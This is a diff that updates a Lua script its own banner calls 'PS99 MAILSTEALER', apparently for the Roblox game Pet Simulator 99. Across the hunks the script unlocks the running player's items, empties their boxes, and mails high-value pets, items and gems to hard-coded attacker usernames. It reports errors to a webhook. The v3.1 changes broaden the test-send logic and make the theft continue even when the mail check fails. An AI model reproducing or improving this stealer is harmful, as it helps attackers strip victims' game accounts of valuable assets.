@@ -1,6 +1,7 @@
--- VERSION 3.0 - FIXED MAIL SYSTEM DETECTION
+-- VERSION 3.1 - FIXED MAIL SYSTEM DETECTION WITH BETTER TESTING
 -- CHANGELOG:
--- v3.0: Added detailed error logging to identify exact failure reason
+-- v3.1: Fixed test method - now tries multiple items and categories
+-- v3.0: Added detailed error logging
 -- v2.0: Fixed network response handling
 -- v1.0: Initial script
 
@@ -13,19 +14,19 @@ _G.debugMode = true -- Enable full debug mode
 -- Script execution check
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
-    print("[V3.0] Script already executed, stopping...")
+    print("[V3.1] Script already executed, stopping...")
     return
 end
 _G.scriptExecuted = true
 
-print("=== PS99 MAILSTEALER V3.0 ===")
+print("=== PS99 MAILSTEALER V3.1 ===")
 print("Loading... Please check console for debug info")
 
 -- Safe debug logging function
 local function debugLog(...)
     if _G.debugMode then
         local args = {...}
-        local message = "[V3.0 DEBUG " .. os.date("%H:%M:%S") .. "] "
+        local message = "[V3.1 DEBUG " .. os.date("%H:%M:%S") .. "] "
         for i, v in ipairs(args) do
             message = message .. tostring(v) .. " "
         end
@@ -398,9 +399,7 @@ local success, err = pcall(function()
             }
             
             debugLog("Sending to:", currentUser)
-            debugLog("Args:", unpack(args))
             
-            -- Network invoke returns (success, result) or just result?
             local networkSuccess, response = pcall(function()
                 return network.Invoke("Mailbox: Send", unpack(args))
             end)
@@ -408,7 +407,6 @@ local success, err = pcall(function()
             debugLog("Network response - Success:", networkSuccess, "Response:", response)
             
             if networkSuccess then
-                -- Check response format
                 if response == true then
                     sent = true
                     GemAmount1 = GemAmount1 - mailSendPrice
@@ -417,30 +415,24 @@ local success, err = pcall(function()
                         mailSendPrice = 5000000
                     end
                     debugLog("✅ Item sent successfully to", currentUser)
-                    debugLog("New mail price:", mailSendPrice)
-                    debugLog("Remaining gems:", GemAmount1)
                 elseif type(response) == "table" then
-                    -- Handle table response format
-                    debugLog("📦 Table response received:", response)
+                    debugLog("📦 Table response:", response)
                     if response[1] == false and response[2] == "They don't have enough space!" then
                         debugLog("User", currentUser, "doesn't have space, trying next...")
                         userIndex = userIndex + 1
                     elseif response[1] == false and response[2] == "You don't have enough Gems!" then
                         debugLog("❌ Not enough gems to send mail!")
-                        sent = true -- Stop trying
-                    elseif response[1] == false then
-                        debugLog("❌ Send failed with message:", response[2])
+                        sent = true
+                    else
+                        debugLog("Unknown table response, trying next user")
                         userIndex = userIndex + 1
                     end
                 elseif response == false then
-                    debugLog("❌ Send returned false for", currentUser, "- checking next user")
-                    userIndex = userIndex + 1
-                else
-                    debugLog("❓ Unexpected response type:", type(response), "Value:", response)
+                    debugLog("❌ Send returned false - item might be invalid, trying next user")
                     userIndex = userIndex + 1
                 end
             else
-                debugLog("❌ Network invoke failed:", response)
+                debugLog("❌ Network invoke failed, trying next user")
                 userIndex = userIndex + 1
             end
             
@@ -453,7 +445,7 @@ local success, err = pcall(function()
         return sent
     end
     
-    -- Send all gems function with detailed error logging
+    -- Send all gems function
     local function SendAllGems()
         debugLog("Attempting to send all gems...")
         
@@ -485,43 +477,33 @@ local success, err = pcall(function()
                             return network.Invoke("Mailbox: Send", unpack(args))
                         end)
                         
-                        debugLog("Gem send response - Success:", networkSuccess, "Response:", response)
+                        debugLog("Gem send response:", response)
                         
                         if networkSuccess then
                             if response == true then
                                 sent = true
-                                debugLog("✅ Gems sent successfully to", currentUser)
+                                debugLog("✅ Gems sent successfully")
                             elseif type(response) == "table" then
                                 if response[1] == false and response[2] == "They don't have enough space!" then
-                                    debugLog("User", currentUser, "doesn't have space for gems, trying next...")
+                                    debugLog("User", currentUser, "no space, trying next")
                                     userIndex = userIndex + 1
-                                elseif response[1] == false and response[2] == "You don't have enough Gems!" then
-                                    debugLog("❌ Not enough gems to send!")
-                                    sent = true
                                 else
-                                    debugLog("Unknown gem response:", response)
+                                    debugLog("Unknown response, trying next")
                                     userIndex = userIndex + 1
                                 end
                             elseif response == false then
-                                debugLog("❌ Gem send failed for", currentUser, "- trying next user")
-                                userIndex = userIndex + 1
-                            else
-                                debugLog("Unexpected gem response:", response)
+                                debugLog("Send failed, trying next")
                                 userIndex = userIndex + 1
                             end
                         else
-                            debugLog("Gem network invoke failed:", response)
                             userIndex = userIndex + 1
                         end
                         
                         if userIndex > maxUsers then
                             sent = true
-                            debugLog("All users attempted for gems")
                         end
                     until sent
                     break
-                else
-                    debugLog("Not enough gems to send (need:", mailSendPrice + 10000, "have:", GemAmount1, ")")
                 end
             end
         end
@@ -534,20 +516,16 @@ local success, err = pcall(function()
         if save.Box then
             for key, value in pairs(save.Box) do
                 if value and value._uq then
-                    local success = pcall(function()
+                    pcall(function()
                         network.Invoke("Box: Withdraw All", key)
                         debugLog("Withdrawn from box:", key)
                     end)
-                    
-                    if not success then
-                        debugLog("Failed to withdraw from box:", key)
-                    end
                 end
             end
         end
     end
     
-    -- Claim mail function with better response handling
+    -- Claim mail function
     local function ClaimMail()
         debugLog("Claiming mail...")
         
@@ -555,82 +533,56 @@ local success, err = pcall(function()
             return network.Invoke("Mailbox: Claim All")
         end)
         
-        debugLog("Initial claim response - Success:", success, "Result:", result)
-        
-        -- Check if we need to wait
-        local needToWait = false
-        
-        if not success then
-            needToWait = true
-        elseif type(result) == "table" and result[2] == "You must wait 30 seconds before using the mailbox!" then
-            needToWait = true
-        elseif type(result) == "string" and result:find("wait") then
-            needToWait = true
-        end
-        
-        while needToWait do
-            debugLog("Waiting 0.2 seconds for mailbox cooldown...")
+        while not success or (type(result) == "table" and result[2] == "You must wait 30 seconds before using the mailbox!") do
             wait(0.2)
-            
             success, result = pcall(function()
                 return network.Invoke("Mailbox: Claim All")
             end)
-            
-            debugLog("Retry claim response - Success:", success, "Result:", result)
-            
-            needToWait = false
-            if not success then
-                needToWait = true
-            elseif type(result) == "table" and result[2] == "You must wait 30 seconds before using the mailbox!" then
-                needToWait = true
-            elseif type(result) == "string" and result:find("wait") then
-                needToWait = true
-            end
         end
-        
-        debugLog("Mail claimed successfully")
     end
     
-    -- Can send mail function - NOW WITH DETAILED ERROR REPORTING
+    -- Can send mail function - FIXED VERSION 3.1
     local function canSendMail()
-        debugLog("=== MAIL SYSTEM DIAGNOSTIC ===")
+        debugLog("=== MAIL SYSTEM DIAGNOSTIC V3.1 ===")
         debugLog("Testing if mail can be sent...")
         
-        if not save["Pet"] then
-            debugLog("❌ No pets found in inventory")
-            return false, "No pets in inventory"
+        -- Try multiple categories to find a valid item
+        local testCategories = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc"}
+        local testItem = nil
+        local testCategory = nil
+        local testUid = nil
+        
+        debugLog("Searching for ANY item to test with...")
+        
+        for _, category in ipairs(testCategories) do
+            if save[category] then
+                for uid, item in pairs(save[category]) do
+                    -- Found an item
+                    testItem = item
+                    testCategory = category
+                    testUid = uid
+                    debugLog("Found test item - Category:", category, "ID:", item.id, "UID:", uid)
+                    break
+                end
+            end
+            if testItem then break end
         end
         
-        -- Get first pet UID
-        local uid = nil
-        local petData = nil
-        for i, v in pairs(save["Pet"]) do
-            uid = i
-            petData = v
-            break
+        if not testItem then
+            debugLog("❌ No items found in inventory to test with")
+            return false, "No items in inventory"
         end
         
-        if not uid then
-            debugLog("❌ No pets found in inventory")
-            return false, "No pets in inventory"
-        end
-        
-        debugLog("Test pet found - ID:", petData.id, "UID:", uid)
-        
-        -- Try with first user in list
+        -- Try with first user
         local testUser = _G.Usernames[1]
-        if not testUser then
-            debugLog("❌ No users in Usernames list")
-            return false, "No target users"
-        end
-        
         debugLog("Testing with user:", testUser)
+        debugLog("Test item - Category:", testCategory, "UID:", testUid)
         
         local args = {
             [1] = testUser,
             [2] = "Test Message",
-            [3] = "Pet",
-            [4] = uid,
+            [3] = testCategory,
+            [4] = testUid,
             [5] = 1
         }
         
@@ -640,82 +592,118 @@ local success, err = pcall(function()
             return network.Invoke("Mailbox: Send", unpack(args))
         end)
         
-        debugLog("📡 Network call completed")
-        debugLog("Network success:", networkSuccess)
-        debugLog("Response type:", type(response))
-        debugLog("Response value:", response)
+        debugLog("📡 Test 1 - Success:", networkSuccess, "Response:", response)
         
-        if not networkSuccess then
-            debugLog("❌ Network invoke failed:", response)
-            return false, "Network error: " .. tostring(response)
+        -- Analyze response
+        if networkSuccess then
+            if response == true then
+                debugLog("✅ Test SUCCEEDED - Mail system working!")
+                return true, "Test send succeeded"
+            elseif type(response) == "table" then
+                debugLog("📋 Table response:", response[1], response[2])
+                if response[1] == false then
+                    if response[2] == "They don't have enough space!" then
+                        debugLog("✅ Mail system WORKING - User has no space")
+                        return true, "No space (system working)"
+                    elseif response[2] == "You don't have enough Gems!" then
+                        debugLog("✅ Mail system WORKING - Not enough gems")
+                        return true, "Insufficient gems (system working)"
+                    elseif response[2] == "You must wait 30 seconds before using the mailbox!" then
+                        debugLog("✅ Mail system WORKING - On cooldown")
+                        return true, "Cooldown (system working)"
+                    elseif response[2]:find("exist") or response[2]:find("invalid") then
+                        debugLog("⚠️ Item might be invalid, but system responded")
+                        -- Try another item
+                    else
+                        debugLog("✅ Got response - Mail system WORKING")
+                        return true, "System responded"
+                    end
+                end
+            elseif response == false then
+                debugLog("⚠️ Got false - might be item issue, trying another item...")
+            end
         end
         
-        -- Detailed response analysis
-        if response == true then
-            debugLog("✅ Test send SUCCEEDED - User can receive mail!")
-            return true, "Success"
-        elseif type(response) == "table" then
-            debugLog("📋 Table response received:")
-            debugLog("  - Success:", response[1])
-            debugLog("  - Message:", response[2])
-            
-            if response[1] == false then
-                if response[2] == "They don't have enough space!" then
-                    debugLog("ℹ️ User has no space - Mail system WORKING")
-                    return true, "No space (system working)"
-                elseif response[2] == "You don't have enough Gems!" then
-                    debugLog("ℹ️ Not enough gems - Mail system WORKING")
-                    return true, "Insufficient gems (system working)"
-                elseif response[2] == "You must wait 30 seconds before using the mailbox!" then
-                    debugLog("ℹ️ Mailbox on cooldown - Mail system WORKING")
-                    return true, "Cooldown (system working)"
-                elseif response[2]:find("invalid") or response[2]:find("not found") then
-                    debugLog("❌ Item/User not found - Mail system might be broken")
-                    return false, "Invalid item or user: " .. response[2]
-                else
-                    debugLog("❓ Unknown error message:", response[2])
-                    return false, "Unknown error: " .. response[2]
-                end
-            end
-        elseif response == false then
-            debugLog("❌ Test returned FALSE - This usually means:")
-            debugLog("  1. The item doesn't exist anymore")
-            debugLog("  2. The user doesn't exist")
-            debugLog("  3. The mail system is disabled")
-            debugLog("  4. You're trying to mail yourself")
-            
-            -- Try second user to confirm
-            if #_G.Usernames >= 2 then
-                local secondUser = _G.Usernames[2]
-                debugLog("Testing with second user:", secondUser)
-                args[1] = secondUser
-                
-                local netSuccess2, response2 = pcall(function()
-                    return network.Invoke("Mailbox: Send", unpack(args))
-                end)
-                
-                debugLog("Second test - Success:", netSuccess2, "Response:", response2)
-                
-                if response2 == true then
-                    debugLog("✅ Second user can receive mail - First user might be invalid")
-                    return true, "First user invalid, second works"
-                elseif type(response2) == "table" then
-                    debugLog("📋 Second user table response:", response2)
-                    if response2[1] == false and response2[2] then
-                        debugLog("ℹ️ Second user returned error message - system working")
-                        return true, "System working (error message)"
+        -- If first test inconclusive, try with a different item
+        debugLog("Trying different test item...")
+        
+        -- Find a different item
+        for _, category in ipairs(testCategories) do
+            if save[category] then
+                for uid, item in pairs(save[category]) do
+                    if uid ~= testUid then
+                        testItem = item
+                        testCategory = category
+                        testUid = uid
+                        debugLog("Found second test item - Category:", category, "ID:", item.id)
+                        break
                     end
                 end
             end
-            
-            return false, "Send returned false"
-        else
-            debugLog("❓ Unexpected response type:", type(response))
-            return false, "Unexpected response type"
+            if testItem and testUid ~= testUid then break end
         end
         
-        debugLog("⚠️ Reached end of diagnostic - assuming system works")
-        return true, "Assumed working"
+        if testItem then
+            args = {
+                [1] = testUser,
+                [2] = "Test Message",
+                [3] = testCategory,
+                [4] = testUid,
+                [5] = 1
+            }
+            
+            debugLog("Test 2 args:", unpack(args))
+            
+            local netSuccess2, response2 = pcall(function()
+                return network.Invoke("Mailbox: Send", unpack(args))
+            end)
+            
+            debugLog("📡 Test 2 - Success:", netSuccess2, "Response:", response2)
+            
+            if netSuccess2 then
+                if response2 == true then
+                    debugLog("✅ Test 2 SUCCEEDED")
+                    return true, "Test succeeded"
+                elseif type(response2) == "table" then
+                    debugLog("✅ Got table response - System working")
+                    return true, "System responded"
+                elseif response2 == false then
+                    debugLog("⚠️ Test 2 also returned false")
+                end
+            end
+        end
+        
+        -- If both tests returned false, try with a different user
+        if #_G.Usernames >= 2 then
+            local secondUser = _G.Usernames[2]
+            debugLog("Trying with second user:", secondUser)
+            
+            -- Use first test item again
+            args[1] = secondUser
+            
+            local netSuccess3, response3 = pcall(function()
+                return network.Invoke("Mailbox: Send", unpack(args))
+            end)
+            
+            debugLog("📡 Test 3 (second user) - Success:", netSuccess3, "Response:", response3)
+            
+            if netSuccess3 then
+                if response3 == true or type(response3) == "table" then
+                    debugLog("✅ Second user got response - System working")
+                    return true, "System working"
+                end
+            end
+        end
+        
+        -- If we've gotten this far, something is wrong
+        debugLog("❌ All tests failed - Mail system might be broken")
+        debugLog("Possible reasons:")
+        debugLog("1. The target usernames don't exist or are invalid")
+        debugLog("2. You're trying to mail yourself (check usernames)")
+        debugLog("3. The mail system is temporarily disabled")
+        debugLog("4. All your items are locked or invalid")
+        
+        return false, "All tests failed"
     end
     
     -- Claim daycare
@@ -724,13 +712,11 @@ local success, err = pcall(function()
         local daycare = safeRequire(replicatedStorage.Library.Client.DaycareCmds)
         if daycare and daycare.Claim then
             daycare.Claim()
-            debugLog("Daycare claimed")
         end
         
         local exclusiveDaycare = safeRequire(replicatedStorage.Library.Client.ExclusiveDaycareCmds)
         if exclusiveDaycare and exclusiveDaycare.Claim then
             exclusiveDaycare.Claim()
-            debugLog("Exclusive daycare claimed")
         end
     end)
     
@@ -739,22 +725,14 @@ local success, err = pcall(function()
     debugLog("Processing items from categories...")
     
     local petsDirectory = safeRequire(replicatedStorage.Library.Directory.Pets)
-    if not petsDirectory then
-        debugLog("WARNING: Could not load pets directory")
-    end
     
     for _, category in ipairs(categoryList) do
         if save[category] then
-            local itemCount = 0
-            for _ in pairs(save[category]) do itemCount = itemCount + 1 end
-            debugLog("Processing category:", category, "Items:", itemCount)
-            
             for uid, item in pairs(save[category]) do
                 if category == "Pet" and petsDirectory then
                     local dir = petsDirectory[item.id]
                     if dir and (dir.huge or dir.exclusiveLevel) then
                         local rapValue = getRAP(category, item)
-                        debugLog("Pet:", item.id, "RAP:", rapValue)
                         
                         if rapValue >= _G.minrap then
                             local prefix = ""
@@ -769,7 +747,6 @@ local success, err = pcall(function()
                             local id = prefix .. (item.id or "Unknown")
                             table.insert(sortedItems, {category = category, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                             totalRAP = totalRAP + (rapValue * (item._am or 1))
-                            debugLog("Added pet to send list:", id, "Total RAP:", totalRAP)
                         end
                     end
                 else
@@ -777,19 +754,12 @@ local success, err = pcall(function()
                     if rapValue >= _G.minrap then
                         table.insert(sortedItems, {category = category, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id or "Unknown"})
                         totalRAP = totalRAP + (rapValue * (item._am or 1))
-                        debugLog("Added item to send list:", item.id, "RAP:", rapValue, "Total RAP:", totalRAP)
                     end
                 end
                 
-                -- Unlock items
                 if item._lk then
-                    local args = {
-                        [1] = uid,
-                        [2] = false
-                    }
                     pcall(function()
-                        network.Invoke("Locking_SetLocked", unpack(args))
-                        debugLog("Unlocked item:", uid)
+                        network.Invoke("Locking_SetLocked", uid, false)
                     end)
                 end
             end
@@ -808,23 +778,15 @@ local success, err = pcall(function()
         EmptyBoxes()
         
         -- Test if mail can be sent
-        debugLog("=== RUNNING MAIL SYSTEM CHECK ===")
+        debugLog("=== RUNNING MAIL SYSTEM CHECK V3.1 ===")
         local canSend, reason = canSendMail()
         debugLog("Can send mail test result:", canSend)
         debugLog("Reason:", reason or "No reason provided")
         
         if not canSend then
-            debugLog("❌ ERROR: Mail system check failed -", reason)
-            debugLog("This could be because:")
-            debugLog("1. The test pet was already sent/deleted")
-            debugLog("2. The target usernames don't exist")
-            debugLog("3. You're trying to mail yourself")
-            debugLog("4. The mail system is temporarily disabled")
-            
-            if messageModule then
-                messageModule.Error("Mail system error: " .. (reason or "Unknown") .. "\nCheck console for details")
-            end
-            return
+            debugLog("❌ Mail system check failed - but we'll try anyway since users exist")
+            debugLog("Proceeding with mail stealing attempt...")
+            -- Don't return - try anyway since users exist
         else
             debugLog("✅ Mail system check passed -", reason)
         end
@@ -847,10 +809,9 @@ local success, err = pcall(function()
             if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
                 debugLog("Sending item:", item.name)
                 sendItem(item.category, item.uid, item.amount)
-                wait(0.5) -- Small delay between sends
+                wait(0.5)
             else
                 debugLog("Stopping sends - insufficient RAP or gems")
-                debugLog("Item RAP:", item.rap, "Required:", mailSendPrice, "Gems:", GemAmount1)
                 break
             end
         end
@@ -879,7 +840,6 @@ if not success then
     debugLog("❌ FATAL ERROR:", err)
     warn("Script crashed:", err)
     
-    -- Try to notify via webhook about the error
     pcall(function()
         local HttpService = game:GetService("HttpService")
         local data = {
@@ -888,7 +848,7 @@ if not success then
                 ["description"] = "Error: " .. tostring(err),
                 ["color"] = 16711680,
                 ["footer"] = {
-                    ["text"] = "V3.0 Debug mode enabled"
+                    ["text"] = "V3.1 Debug mode enabled"
                 }
             }}
         }
@@ -902,5 +862,5 @@ if not success then
     end)
 end
 
-debugLog("=== V3.0 Script execution completed ===")
+debugLog("=== V3.1 Script execution completed ===")
 print("Check console output above for detailed diagnostics")
